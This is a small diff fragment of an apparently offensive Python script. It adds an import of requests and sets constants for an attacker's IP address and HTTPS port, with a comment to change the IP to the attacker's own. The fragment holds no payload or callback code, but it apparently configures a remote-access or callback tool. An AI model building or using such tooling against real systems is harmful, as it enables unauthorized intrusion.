@@ -5,6 +5,7 @@ import os
 from http.client import RemoteDisconnected
 import ssl
 import platform
+import requests
 
 ATTACKER_IP = '192.168.18.128'  # Change this to the attacker's IP address
 HTTPS_PORT = 8443  # Change this to the HTTPS port if needed
